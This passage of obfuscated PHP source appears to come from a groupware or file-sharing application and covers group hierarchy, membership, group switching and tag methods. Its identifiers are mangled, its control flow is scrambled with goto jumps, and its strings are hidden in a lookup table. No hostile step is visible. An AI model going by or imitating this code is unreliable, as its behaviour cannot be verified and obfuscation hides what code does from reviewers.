EÒ´Òî“òË; EÒ´Òî“òË: $c“õ•šÍîÊ[$fñ°ñ‚ÂİÌ[364]][$fñ°ñ‚ÂİÌ[366]] = ceil($c“õ•šÍîÊ[$fñ°ñ‚ÂİÌ[364]][$fñ°ñ‚ÂİÌ[365]] / $c“õ•šÍîÊ[$fñ°ñ‚ÂİÌ[364]][$fñ°ñ‚ÂİÌ[361]]); goto bÇˆĞåÜ£; bÇˆĞåÜ£: } $this->_listDataApply($c“õ•šÍîÊ[$fñ°ñ‚ÂİÌ[367]]); goto CéëÌá; c™‘İ—«ä“: $fñ°ñ‚ÂİÌ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f• –ßº½ = $dãÎ×³ŠíÏ[$fñ°ñ‚ÂİÌ[1807]]; $d’±ê‡Ú©ç = isset($dãÎ×³ŠíÏ[$fñ°ñ‚ÂİÌ[1808]]) ? $dãÎ×³ŠíÏ[$fñ°ñ‚ÂİÌ[1808]] : !1; goto A‰¬£ŠÆÚº; BóÒ†Ûˆ: if ($d’±ê‡Ú©ç) { $EÑ‹÷Ù„¯ä = $this->getInfoSimple($d’±ê‡Ú©ç); $bÈˆÆ„‡õ¸ = $EÑ‹÷Ù„¯ä[$fñ°ñ‚ÂİÌ[515]] . $d’±ê‡Ú©ç . $fñ°ñ‚ÂİÌ[539]; $BÉî•Ã¿ = array($BÉî•Ã¿, array($fñ°ñ‚ÂİÌ[515] => array($fñ°ñ‚ÂİÌ[381], $bÈˆÆ„‡õ¸))); } $BÉî•Ã¿ = $this->parseWhereLike($BÉî•Ã¿); $c“õ•šÍîÊ = $this->_makeOrder()->where($BÉî•Ã¿)->selectPage(20); goto b¯“ò›å¹‘; aÜÍ²îâÎ–: } protected function groupChildrenAll($E·÷çåªï) { $CÛ£‚°°ŠÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$E·÷çåªï) { return !1; } if (is_string($E·÷çåªï)) { $E·÷çåªï = array($E·÷çåªï); } $AÎáŸùÏçß = $E·÷çåªï; foreach ($E·÷çåªï as $CÈÜÖ‘¾¤Ú) { $FˆùÏÇ©‘ = $this->getInfoSimple($CÈÜÖ‘¾¤Ú); $EçäÎŠ¬¢ˆ = array($CÛ£‚°°ŠÔ[515] => array($CÛ£‚°°ŠÔ[381], $FˆùÏÇ©‘[$CÛ£‚°°ŠÔ[515]] . $CÈÜÖ‘¾¤Ú . $CÛ£‚°°ŠÔ[539])); $f‘Îù²‚éÆ = $this->field($CÛ£‚°°ŠÔ[1719])->where($EçäÎŠ¬¢ˆ)->select(); $AÎáŸùÏçß = array_merge($AÎáŸùÏçß, array_to_keyvalue($f‘Îù²‚éÆ, $CÛ£‚°°ŠÔ[33], $CÛ£‚°°ŠÔ[1719])); } return array_unique($AÎáŸùÏçß); } private function _searchFromMeta($Fªçàà›çö, $A‡ºñ„©–Õ, $cåÃ“ÌèË , $cŒâ²“ƒ) { goto B’‹¡‡±šœ; e„¨ìÄ‚©ó: if (!$EÆóâº–) { return array(); } $EÆóâº– = array_to_keyvalue($EÆóâº–, $B¸ÔòÔªí[33], $B¸ÔòÔªí[1719]); $dª¥æ¤…†† = $this->where(array($B¸ÔòÔªí[1803] => array($B¸ÔòÔªí[7], $EÆóâº–)))->select(); goto d˜ÚêÊ¾“†; d˜ÚêÊ¾“†: if (!$dª¥æ¤…††) { return array(); } return $dª¥æ¤…††; goto Eò˜´Š‹¡Ö; eÈ’÷âö: $bÕ˜Ë«µ¿ = $this->parseWhereLike($bÕ˜Ë«µ¿); if ($cŒâ²“ƒ) { $bÕ˜Ë«µ¿[$B¸ÔòÔªí[1719]] = array($B¸ÔòÔªí[7], $cŒâ²“ƒ); } $EÆóâº– = Model($B¸ÔòÔªí[1812])->where($bÕ˜Ë«µ¿)->limit($cåÃ“ÌèË )->select(); goto e„¨ìÄ‚©ó; B’‹¡‡±šœ: $B¸ÔòÔªí =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A‡ºñ„©–Õ = strtolower($A‡ºñ„©–Õ); $bÕ˜Ë«µ¿ = array($B¸ÔòÔªí[93] => $Fªçàà›çö, $B¸ÔòÔªí[372] => array($B¸ÔòÔªí[381], "\45{$A‡ºñ„©–Õ}\x25")); goto eÈ’÷âö; Eò˜´Š‹¡Ö: } protected function _listDataApplyItem($C‹“¦Úöô¾) { $Dª‰Î‚ÁŸ = array($C‹“¦Úöô¾); $this->_listDataApply($Dª‰Î‚ÁŸ); return $Dª‰Î‚ÁŸ[0]; } protected function _listDataApply(&$aíºçö•Ì) { goto fá”¸Î‹ª§; fá”¸Î‹ª§: $B¨°øÍøÁ¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$aíºçö•Ì) { return; } $fµÌö’Ìæ¹ = array_to_keyvalue($aíºçö•Ì, $B¨°øÍøÁ¡[33], $B¨°øÍøÁ¡[1719]); goto e«¦ºŠ•è; bÇƒÜÚ‡’×: $this->_listAppendParent($aíºçö•Ì); $this->_listAppendSourceRoot($aíºçö•Ì, $fµÌö’Ìæ¹); goto e¶èğì»›Ò; e«¦ºŠ•è: $this->_listAppendChildren($aíºçö•Ì); $this->_listAppendChildrenMember($aíºçö•Ì); $this->_listAppendMeta($aíºçö•Ì, $fµÌö’Ìæ¹); goto bÇƒÜÚ‡’×; e¶èğì»›Ò: } private function _listAppendChildren(&$B¾Ê¹†¢™) { goto d‡´¡ƒ; E‚´‹ÊÍ†Š: foreach ($B¾Ê¹†¢™ as &$bŠŠ²†À°Ô) { $AÜÓƒ¯Ãô‹ = $bŠŠ²†À°Ô[$Eãã¹Ò£®Í[1719]]; $bŠŠ²†À°Ô[$Eãã¹Ò£®Í[1814]] = isset($b²Œ¸¶ğŠ—[$AÜÓƒ¯Ãô‹]) ? intval($b²Œ¸¶ğŠ—[$AÜÓƒ¯Ãô‹]) : !1; } unset($bŠŠ²†À°Ô); goto eÕ°Öê‰™ô; DØÓÓ™åÖŸ: $bœÊ—¹òÉ‚ = array($Eãã¹Ò£®Í[492], $Eãã¹Ò£®Í[1813] => $Eãã¹Ò£®Í[494]); $C‹„ÎÛ¦ƒ = $this->field($bœÊ—¹òÉ‚)->where($aÄÊáÛÖÙ)->group($Eãã¹Ò£®Í[492])->select(); $b²Œ¸¶ğŠ— = array_to_keyvalue($C‹„ÎÛ¦ƒ, $Eãã¹Ò£®Í[492], $Eãã¹Ò£®Í[494]); goto E‚´‹ÊÍ†Š; d‡´¡ƒ: $Eãã¹Ò£®Í =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b³¬Ã˜§ÈÙ = array_to_keyvalue($B¾Ê¹†¢™, $Eãã¹Ò£®Í[33], $Eãã¹Ò£®Í[1719]); $aÄÊáÛÖÙ = array($Eãã¹Ò£®Í[492] => array($Eãã¹Ò£®Í[7], $b³¬Ã˜§ÈÙ)); goto DØÓÓ™åÖŸ; eÕ°Öê‰™ô: } private function _listAppendChildrenMember(&$D¤Ãã °‹) { goto E¥àŒ—êª; E¥àŒ—êª: $E†ñÎˆ³ù =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bØŸ­¹ˆ« = array_to_keyvalue($D¤Ãã °‹, $E†ñÎˆ³ù[33], $E†ñÎˆ³ù[1719]); $B‘¬æ£Â = array($E†ñÎˆ³ù[1719] => array($E†ñÎˆ³ù[7], $bØŸ­¹ˆ«)); goto fµ¥ªå²ÁÊ; C‡®òÚ‹‰Í: foreach ($D¤Ãã °‹ as &$c’çÄÃÙ¼Õ) { $fÚ¼«Šæ•Á = $c’çÄÃÙ¼Õ[$E†ñÎˆ³ù[1719]]; $c’çÄÃÙ¼Õ[$E†ñÎˆ³ù[1815]] = isset($dèçïÊÀ¿[$fÚ¼«Šæ•Á]) ? intval($dèçïÊÀ¿[$fÚ¼«Šæ•Á]) : !1; } unset($c’çÄÃÙ¼Õ); goto D°Çñ´÷¶; fµ¥ªå²ÁÊ: $C‹ñ¬¨Ÿ² = array($E†ñÎˆ³ù[1719], $E†ñÎˆ³ù[1813] => $E†ñÎˆ³ù[494]); $föÊ¶Ğ¿ = Model($E†ñÎˆ³ù[1805])->field($C‹ñ¬¨Ÿ²)->where($B‘¬æ£Â)->group($E†ñÎˆ³ù[1719])->select(); $dèçïÊÀ¿ = array_to_keyvalue($föÊ¶Ğ¿, $E†ñÎˆ³ù[1719], $E†ñÎˆ³ù[494]); goto C‡®òÚ‹‰Í; D°Çñ´÷¶: } private function _listAppendMeta(&$e£¨•Š, $aš®¯†à‡) { goto C‹„ÕŞ‚ƒ„; e­÷‹÷À: foreach ($e£¨•Š as &$A¹‡Ä±î§º) { $A¹‡Ä±î§º[$eé­Ò÷ƒô”[459]] = array(); if (isset($DÑÀÒÅ¦·´[$A¹‡Ä±î§º[$eé­Ò÷ƒô”[1719]]])) { $A¹‡Ä±î§º[$eé­Ò÷ƒô”[459]] = $DÑÀÒÅ¦·´[$A¹‡Ä±î§º[$eé­Ò÷ƒô”[1719]]]; } } unset($A¹‡Ä±î§º); goto aßòª“Àº; Fæò…ó¬­ê: $DÑÀÒÅ¦·´ = array_to_keyvalue_group($DÑÀÒÅ¦·´, $eé­Ò÷ƒô”[1719]); foreach ($DÑÀÒÅ¦·´ as &$E˜Ñ˜©÷Ø¦) { $E˜Ñ˜©÷Ø¦ = array_to_keyvalue($E˜Ñ˜©÷Ø¦, $eé­Ò÷ƒô”[93], $eé­Ò÷ƒô”[372]); } unset($E˜Ñ˜©÷Ø¦); goto e­÷‹÷À; C‹„ÕŞ‚ƒ„: $eé­Ò÷ƒô” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BÓ±é×¥§£ = array($eé­Ò÷ƒô”[1719] => array($eé­Ò÷ƒô”[7], $aš®¯†à‡)); $DÑÀÒÅ¦·´ = Model($eé­Ò÷ƒô”[1804])->where($BÓ±é×¥§£)->select(); goto Fæò…ó¬­ê; aßòª“Àº: } protected function parentLevelArray($C×½çÚµÆÜ) { $bğÉ‘ÌËãˆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C×½çÚµÆÜ = explode($bğÉ‘ÌËãˆ[47], trim($C×½çÚµÆÜ, $bğÉ‘ÌËãˆ[47])); $C×½çÚµÆÜ = array_remove_value($C×½çÚµÆÜ, $bğÉ‘ÌËãˆ[191]); return $C×½çÚµÆÜ; } private function _listAppendParent(&$FËò×¥âÇ) { goto B÷¢ãŸáÅŠ; B÷¢ãŸáÅŠ: $fî†¿²Ó ½ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f‚Ë°ÖÑÇ¨ = array(); foreach ($FËò×¥âÇ as &$B–ŸÜ—ñ¾ğ) { $f‚Ë°ÖÑÇ¨[$B–ŸÜ—ñ¾ğ[$fî†¿²Ó ½[1719]]] = $B–ŸÜ—ñ¾ğ[$fî†¿²Ó ½[28]]; $f‹èäÒ·¾å = $this->parentLevelArray($B–ŸÜ—ñ¾ğ[$fî†¿²Ó ½[515]]); foreach ($f‹èäÒ·¾å as $AîàÔˆãë) { if (!isset($f‚Ë°ÖÑÇ¨[$AîàÔˆãë])) { $f‚Ë°ÖÑÇ¨[$AîàÔˆãë] = 0; } } } goto dÕ‹öÏ”ä²; dÕ‹öÏ”ä²: unset($B–ŸÜ—ñ¾ğ); foreach ($f‚Ë°ÖÑÇ¨ as $c¥Ìˆ˜“¯ => $Ešõ•ø©Ê‹) { if ($Ešõ•ø©Ê‹) { continue; } $eø§‰Û¹ç = $this->getInfoSimple($c¥Ìˆ˜“¯); $f‚Ë°ÖÑÇ¨[$c¥Ìˆ˜“¯] = $eø§‰Û¹ç[$fî†¿²Ó ½[28]]; } $A’“§åŸ¤¥ = $GLOBALS[$fî†¿²Ó ½[6]][$fî†¿²Ó ½[88]][$fî†¿²Ó ½[1816]]; goto cÅöÉó‹ßÊ; cÅöÉó‹ßÊ: if ($GLOBALS[$fî†¿²Ó ½[499]] == $fî†¿²Ó ½[87]) { $A’“§åŸ¤¥ = !1; } foreach ($FËò×¥âÇ as &$B–ŸÜ—ñ¾ğ) { $f‹èäÒ·¾å = $this->parentLevelArray($B–ŸÜ—ñ¾ğ[$fî†¿²Ó ½[515]]); $C¸ùİŞ…‚ê = $fî†¿²Ó ½[33]; foreach ($f‹èäÒ·¾å as $c¥Ìˆ˜“¯ => $AîàÔˆãë) { if ($A’“§åŸ¤¥ && $c¥Ìˆ˜“¯ == 0) { continue; } $C¸ùİŞ…‚ê .= $f‚Ë°ÖÑÇ¨[$AîàÔˆãë] . $fî†¿²Ó ½[8]; } if ($f‹èäÒ·¾å) { $C¸ùİŞ…‚ê .= $B–ŸÜ—ñ¾ğ[$fî†¿²Ó ½[28]]; } $B–ŸÜ—ñ¾ğ[$fî†¿²Ó ½[520]] = str_replace($fî†¿²Ó ½[523], $fî†¿²Ó ½[8], $C¸ùİŞ…‚ê); } unset($B–ŸÜ—ñ¾ğ); goto açÇàÇõÎ‡; açÇàÇõÎ‡: } private function _listAppendSourceRoot(&$Dğ«Ö³¡í, $B¥»’……­) { goto bÈ¹Š¢; cÆŠº¥Æ: $f®ÇŒø­ïœ = $Ašëë‚®”Æ->limit(count($B¥»’……­))->where($aÈÏó»±)->select(); $f®ÇŒø­ïœ = array_to_keyvalue($f®ÇŒø­ïœ, $AÌ´‘ØóŒó[498]); $f®ÇŒø­ïœ = array_remove_key($f®ÇŒø­ïœ, $AÌ´‘ØóŒó[498]); goto e¼é°ÎÖˆ±; bÈ¹Š¢: $AÌ´‘ØóŒó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÈÏó»± = array($AÌ´‘ØóŒó[492] => 0, $AÌ´‘ØóŒó[498] => array($AÌ´‘ØóŒó[7], $B¥»’……­), $AÌ´‘ØóŒó[406] => SourceModel::TYPE_GROUP); $Ašëë‚®”Æ = Model($AÌ´‘ØóŒó[813])->order($AÌ´‘ØóŒó[1817])->field($AÌ´‘ØóŒó[1818]); goto cÆŠº¥Æ; e¼é°ÎÖˆ±: foreach ($Dğ«Ö³¡í as &$fô›¢“ ²Á) { $fô›¢“ ²Á[$AÌ´‘ØóŒó[85]] = $f®ÇŒø­ïœ[$fô›¢“ ²Á[$AÌ´‘ØóŒó[1719]]] ? $f®ÇŒø­ïœ[$fô›¢“ ²Á[$AÌ´‘ØóŒó[1719]]] : array(); } unset($fô›¢“ ²Á); goto bÃƒã¿£Œ; bÃƒã¿£Œ: } protected function groupMerge($eëç±”ğ¢¥) { $eëç±”ğ¢¥ = array_values(array_unique($eëç±”ğ¢¥)); $d…Êî¹™Á¹ = array(); for ($cĞŸÛ‰ƒ©ƒ = 0; $cĞŸÛ‰ƒ©ƒ < count($eëç±”ğ¢¥); $cĞŸÛ‰ƒ©ƒ++) { $d¨«Â†¨Ö = !1; for ($a‹æ„ÑµÍ = 0; $a‹æ„ÑµÍ < count($eëç±”ğ¢¥); $a‹æ„ÑµÍ++) { if ($cĞŸÛ‰ƒ©ƒ == $a‹æ„ÑµÍ) { continue; } if ($this->isParentOf($eëç±”ğ¢¥[$a‹æ„ÑµÍ], $eëç±”ğ¢¥[$cĞŸÛ‰ƒ©ƒ])) { $d¨«Â†¨Ö = !0; break; } } if (!$d¨«Â†¨Ö) { $d…Êî¹™Á¹[] = $eëç±”ğ¢¥[$cĞŸÛ‰ƒ©ƒ]; } } return $d…Êî¹™Á¹; } protected function isParentOf($Eâ™Æ®âœ†, $eÃÄáºê¿) { goto e’£ƒŒ’ê; AØ¤å×º: $bÁè£Á¼¦» = $this->getInfoSimple($eÃÄáºê¿); $Aï¯ÈÆîÍ = $B¸óÊ²›É[$a¨ØŸÄ“»Õ[515]] . $Eâ™Æ®âœ† . $a¨ØŸÄ“»Õ[47]; if (substr($bÁè£Á¼¦»[$a¨ØŸÄ“»Õ[515]], 0, strlen($Aï¯ÈÆîÍ)) == $Aï¯ÈÆîÍ) { return !0; } goto A’–ÓŠ¶ğ; e’£ƒŒ’ê: $a¨ØŸÄ“»Õ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$Eâ™Æ®âœ† || !$eÃÄáºê¿ || $Eâ™Æ®âœ† == $eÃÄáºê¿) { return !1; } $B¸óÊ²›É = $this->getInfoSimple($Eâ™Æ®âœ†); goto AØ¤å×º; A’–ÓŠ¶ğ: return !1; goto d—¤åÅÚéÃ; d—¤åÅÚéÃ: } public function groupShowRoot($BØˆƒóáøÖ, $BÚŠ„‹äõ = false) { goto A¯ó™ä«÷Õ; F¥äá é: return $dŞãÄ·¤Ş÷; goto AÆŠŞŒä±ö; d—ï“é·åÌ: $Fˆ‚ÒÓ‡áÓ = $this->parentLevelArray($eÏÚÚôÒ°¸[$e¯Ì¢Ğšæ[515]]); $dŞãÄ·¤Ş÷ = array($BØˆƒóáøÖ); if (count($Fˆ‚ÒÓ‡áÓ) == 0) { return $dŞãÄ·¤Ş÷; } goto f÷–õÖ‡Ø; f÷–õÖ‡Ø: if ($BÚŠ„‹äõ && count($Fˆ‚ÒÓ‡áÓ) == 1) { return $dŞãÄ·¤Ş÷; } if (!$eÏÚÚôÒ°¸[$e¯Ì¢Ğšæ[459]] || !isset($eÏÚÚôÒ°¸[$e¯Ì¢Ğšæ[459]][$e¯Ì¢Ğšæ[1801]]) || $eÏÚÚôÒ°¸[$e¯Ì¢Ğšæ[459]][$e¯Ì¢Ğšæ[1801]] == $e¯Ì¢Ğšæ[1773]) { return $this->groupShowRoot($Fˆ‚ÒÓ‡áÓ[count($Fˆ‚ÒÓ‡áÓ) - 1], $BÚŠ„‹äõ); } if ($eÏÚÚôÒ°¸[$e¯Ì¢Ğšæ[459]][$e¯Ì¢Ğšæ[1801]] == $e¯Ì¢Ğšæ[355]) { $c•‚Ï½±‡ = explode($e¯Ì¢Ğšæ[47], $eÏÚÚôÒ°¸[$e¯Ì¢Ğšæ[459]][$e¯Ì¢Ğšæ[1802]]); if ($c•‚Ï½±‡) { $dŞãÄ·¤Ş÷ = array_merge($dŞãÄ·¤Ş÷, $c•‚Ï½±‡); } } goto F¥äá é; A¯ó™ä«÷Õ: $e¯Ì¢Ğšæ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÏÚÚôÒ°¸ = $this->getInfo($BØˆƒóáøÖ); if (!$eÏÚÚôÒ°¸) { return array(); } goto d—ï“é·åÌ; AÆŠŞŒä±ö: } protected function resetParentLevel() { $dÊ¤ÃÙ˜Œ¼ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÂ ï¢‚Óš = $dÊ¤ÃÙ˜Œ¼[1719]; $b”ˆÄ³¹‰‹ = $this->select(); $b”ˆÄ³¹‰‹ = array_to_keyvalue($b”ˆÄ³¹‰‹, $fÂ ï¢‚Óš); foreach ($b”ˆÄ³¹‰‹ as $dÎÜ¢±¡”) { goto E‹´Ûó©«; DÎ¥ Ÿš¦ô: $aš”ƒ¦‹í–[] = 0; $aš”ƒ¦‹í– = $dÊ¤ÃÙ˜Œ¼[47] . implode($dÊ¤ÃÙ˜Œ¼[47], array_reverse($aš”ƒ¦‹í–)) . $dÊ¤ÃÙ˜Œ¼[47]; $this->setNamePinyin($dÎÜ¢±¡”[$fÂ ï¢‚Óš], $dÎÜ¢±¡”[$dÊ¤ÃÙ˜Œ¼[28]]); goto B™ÔÓªæğŠ; B™ÔÓªæğŠ: $this->where(array($fÂ ï¢‚Óš => $dÎÜ¢±¡”[$fÂ ï¢‚Óš]))->save(array($dÊ¤ÃÙ˜Œ¼[578] => $aš”ƒ¦‹í–)); goto a­İñĞ×ğ; E‹´Ûó©«: $Eãœ¾™š„© = $dÎÜ¢±¡”; $aš”ƒ¦‹í– = array(); while ($Eãœ¾™š„©[$dÊ¤ÃÙ˜Œ¼[492]] != 0) { $aš”ƒ¦‹í–[] = $Eãœ¾™š„©[$dÊ¤ÃÙ˜Œ¼[492]]; $Eãœ¾™š„© = $b”ˆÄ³¹‰‹[$Eãœ¾™š„©[$dÊ¤ÃÙ˜Œ¼[492]]]; } goto DÎ¥ Ÿš¦ô; a­İñĞ×ğ: } return $b”ˆÄ³¹‰‹; } public function groupNameAuto($A¸²­‘Ì¾, $D–½Ï„ğ™Î) { $bòŞ…Ç‹îæ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bíòòò‰› = $this->where(array($bòŞ…Ç‹îæ[396] => $A¸²­‘Ì¾))->getField($bòŞ…Ç‹îæ[28], !0); if (!$bíòòò‰› || !in_array($D–½Ï„ğ™Î, $bíòòò‰›)) { return $D–½Ï„ğ™Î; } for ($cÓ íŒİ° = 1; $cÓ íŒİ° <= count($bíòòò‰›) + 1; $cÓ íŒİ°++) { $b¨¸ÄéáêŒ = $D–½Ï„ğ™Î . "\50{$cÓ íŒİ°}\51"; if (!in_array($b¨¸ÄéáêŒ, $bíòòò‰›)) { return $b¨¸ÄéáêŒ; } } } public function groupSwitch($BßÌå”Â–, $a¤ÍÒ¿¶íÈ) { goto AêÃÆÈÕÉ¤; c²éõ¡«î²: $AšäÄˆíÆ = array($Föç¨ÖæŒ[406] => 2, $Föç¨ÖæŒ[492] => 0, $Föç¨ÖæŒ[405] => 1, $Föç¨ÖæŒ[498] => array($Föç¨ÖæŒ[7], array($BßÌå”Â–, $a¤ÍÒ¿¶íÈ))); $Fó¦£‹Èãå = Model($Föç¨ÖæŒ[813])->where($AšäÄˆíÆ)->field($Föç¨ÖæŒ[1820])->select(); $Fó¦£‹Èãå = array_to_keyvalue($Fó¦£‹Èãå, $Föç¨ÖæŒ[498], $Föç¨ÖæŒ[397]); goto DÚùŸº‘; f¬ÛÛİ×ö: $Aèæ…óö± = array_to_keyvalue($Aèæ…óö±, $Föç¨ÖæŒ[1719]); if (!isset($Aèæ…óö±[$BßÌå”Â–]) || !isset($Aèæ…óö±[$a¤ÍÒ¿¶íÈ]) || $Aèæ…óö±[$BßÌå”Â–][$Föç¨ÖæŒ[492]] == 0) { return !1; } $AšäÄˆíÆ = array($Föç¨ÖæŒ[1719] => $BßÌå”Â–); goto eİÁ¯ê¬òç; cšéª®À: $this->where(array($Föç¨ÖæŒ[492] => $BßÌå”Â–))->save(array($Föç¨ÖæŒ[492] => $a¤ÍÒ¿¶íÈ)); $this->_clearChildrenCache($Aèæ…óö±[$a¤ÍÒ¿¶íÈ]); return !0; goto FÓ¡‰òîÄ”; eİÁ¯ê¬òç: $EÕƒ›øƒ‰Ö = Model($Föç¨ÖæŒ[1805])->where($AšäÄˆíÆ)->select(); if (!$EÕƒ›øƒ‰Ö) { $EÕƒ›øƒ‰Ö = array(); } foreach ($EÕƒ›øƒ‰Ö as $B­¥¸ÀŠîñ) { $A¸£â¢£Û = $B­¥¸ÀŠîñ[$Föç¨ÖæŒ[1550]]; $AšäÄˆíÆ = array($Föç¨ÖæŒ[1550] => $A¸£â¢£Û, $Föç¨ÖæŒ[1719] => $a¤ÍÒ¿¶íÈ); $bğê•±² ´ = Model($Föç¨ÖæŒ[1805])->where($AšäÄˆíÆ)->find(); if (!$bğê•±² ´) { $bÄ¯ç¿îãè = array($a¤ÍÒ¿¶íÈ => $B­¥¸ÀŠîñ[$Föç¨ÖæŒ[1819]]); Model($Föç¨ÖæŒ[532])->userGroupAdd($A¸£â¢£Û, $bÄ¯ç¿îãè); } Model($Föç¨ÖæŒ[532])->userGroupRemove($A¸£â¢£Û, $BßÌå”Â–); } goto c²éõ¡«î²; AêÃÆÈÕÉ¤: $Föç¨ÖæŒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AšäÄˆíÆ = array($Föç¨ÖæŒ[1719] => array($Föç¨ÖæŒ[7], array($BßÌå”Â–, $a¤ÍÒ¿¶íÈ))); $Aèæ…óö± = $this->where($AšäÄˆíÆ)->select(); goto f¬ÛÛİ×ö; DÚùŸº‘: $FÙ‰¶¿‰‰ï = !empty($Fó¦£‹Èãå[$BßÌå”Â–]) ? $Fó¦£‹Èãå[$BßÌå”Â–] : !1; if ($FÙ‰¶¿‰‰ï) { goto EµŒº³¾ö; cĞİ‘×ù‚£: $Fó¦£‹Èãå = Model($Föç¨ÖæŒ[813])->where($AšäÄˆíÆ)->field($Föç¨ÖæŒ[1821])->select(); if (!$Fó¦£‹Èãå) { $Fó¦£‹Èãå = array(); } Model($Föç¨ÖæŒ[813])->moveClearAuth = !1; goto f÷ºùÛÛ†; bƒ´ÃƒëŒÎ: $FÂÒÍŞÌ¡Ì = array($Föç¨ÖæŒ[498] => $a¤ÍÒ¿¶íÈ); Model($Föç¨ÖæŒ[1822])->where($AšäÄˆíÆ)->save($FÂÒÍŞÌ¡Ì); Model($Föç¨ÖæŒ[1823])->where($AšäÄˆíÆ)->save($FÂÒÍŞÌ¡Ì); goto Eº–åµÕÜİ; EµŒº³¾ö: if (!$Fó¦£‹Èãå[$a¤ÍÒ¿¶íÈ]) { $Fó¦£‹Èãå[$a¤ÍÒ¿¶íÈ] = Model($Föç¨ÖæŒ[813])->groupRootAdd($a¤ÍÒ¿¶íÈ); } $f”ô‰æØ‚  = $Fó¦£‹Èãå[$a¤ÍÒ¿¶íÈ]; $AšäÄˆíÆ = array($Föç¨ÖæŒ[492] => $FÙ‰¶¿‰‰ï); goto cĞİ‘×ù‚£; f÷ºùÛÛ†: foreach ($Fó¦£‹Èãå as $a¬µÛ“Ë‡‰) { $a¡›´¼­¿ = $a¬µÛ“Ë‡‰[$Föç¨ÖæŒ[405]] == $Föç¨ÖæŒ[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Föç¨ÖæŒ[813])->move($a¬µÛ“Ë‡‰[$Föç¨ÖæŒ[397]], $f”ô‰æØ‚ , $a¡›´¼­¿); } Model($Föç¨ÖæŒ[813])->moveClearAuth = !0; $AšäÄˆíÆ = array($Föç¨ÖæŒ[406] => 2, $Föç¨ÖæŒ[498] => $BßÌå”Â–); goto bƒ´ÃƒëŒÎ; Eº–åµÕÜİ: } $this->_changeChildLevel($Aèæ…óö±[$BßÌå”Â–], $Aèæ…óö±[$a¤ÍÒ¿¶íÈ], !0); goto cšéª®À; FÓ¡‰òîÄ”: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($E—ùÍ„Ú¯è) { $C¿²¹ù“×è =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return array($C¿²¹ù“×è[1824] => array($E—ùÍ„Ú¯è[0], $C¿²¹ù“×è[1825]), $C¿²¹ù“×è[1826] => array($E—ùÍ„Ú¯è[0], $C¿²¹ù“×è[1827])); } protected function get($c‚ßÊò’²©) { $BùŒÛº’Õ‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aË¾©Óø¾ = Model($BùŒÛº’Õ‡[516])->metaGet($c‚ßÊò’²©, $BùŒÛº’Õ‡[1828]); $F¹Š¸ÇÜ¡ = json_decode($aË¾©Óø¾, !0); return $F¹Š¸ÇÜ¡ ? $F¹Š¸ÇÜ¡ : array($BùŒÛº’Õ‡[1829] => $BùŒÛº’Õ‡[87], $BùŒÛº’Õ‡[367] => array()); } protected function set($aŠœ§Ù¬Ó», $c§×ªœĞĞå) { $CÂùİÜ›•À =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c§×ªœĞĞå = $c§×ªœĞĞå ? $c§×ªœĞĞå : array($CÂùİÜ›•À[1829] => $CÂùİÜ›•À[87], $CÂùİÜ›•À[367] => array()); Model($CÂùİÜ›•À[516])->metaSet($aŠœ§Ù¬Ó», $CÂùİÜ›•À[1828], json_encode($c§×ªœĞĞå)); return Model($CÂùİÜ›•À[516])->metaSet($aŠœ§Ù¬Ó», $CÂùİÜ›•À[1828], json_encode($c§×ªœĞĞå)); } protected function getByTagID($D¿ÅÑÃ‹Ş, $aŞ¦’°Ç¸Ü) { goto F±‹‡Ò˜¨; a¾ˆé·ä¢‰: return is_array($dù«´í××´) ? $dù«´í××´ : !1; goto Eî‘îŠÔâï; F±‹‡Ò˜¨: $fÑö÷‰è¸« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$D¿ÅÑÃ‹Ş || !$aŞ¦’°Ç¸Ü) { return !1; } if (!Model($fÑö÷‰è¸«[516])->getInfoSimple($D¿ÅÑÃ‹Ş)) { return !1; } goto CÛÚœÆ¸¥è; CÛÚœÆ¸¥è: $F˜Ó¥ç¥ = $this->get($D¿ÅÑÃ‹Ş); if (!$F˜Ó¥ç¥ || !isset($F˜Ó¥ç¥[$fÑö÷‰è¸«[367]])) { return !1; } $dù«´í××´ = array_find_by_field($F˜Ó¥ç¥[$fÑö÷‰è¸«[367]], $fÑö÷‰è¸«[395], $aŞ¦’°Ç¸Ü); goto a¾ˆé·ä¢‰; Eî‘îŠÔâï: } public function listSource($a²®ËòƒÉ”, $f°»¬êŸÊá) { goto EœÁÚ†ªÕÄ; eÇëÅƒåˆ¯: $DÀŞÆˆ§‚¦ = Model($AïØì›ÅÁ­[1227])->listSource($dÏ¡ËÄ„‘); if (!$DÀŞÆˆ§‚¦ || count($fÛ‡‘ÉôÈ) == $DÀŞÆˆ§‚¦[$AïØì›ÅÁ­[364]][$AïØì›ÅÁ­[365]]) { return $DÀŞÆˆ§‚¦; } $bĞõÇßÖÔ¤ = array(); goto FÅóÓ¡¹”ï; FÅóÓ¡¹”ï: $dØÑ¹´ï˜µ = array_to_keyvalue($DÀŞÆˆ§‚¦[$AïØì›ÅÁ­[75]], $AïØì›ÅÁ­[33], $AïØì›ÅÁ­[397]); $c—­ù„ºñ¼ = array_to_keyvalue($DÀŞÆˆ§‚¦[$AïØì›ÅÁ­[74]], $AïØì›ÅÁ­[33], $AïØì›ÅÁ­[397]); $Aº¶Ê‰âšå = array_merge($c—­ù„ºñ¼, $dØÑ¹´ï˜µ); goto A¯ïùÇŒ¤Û; 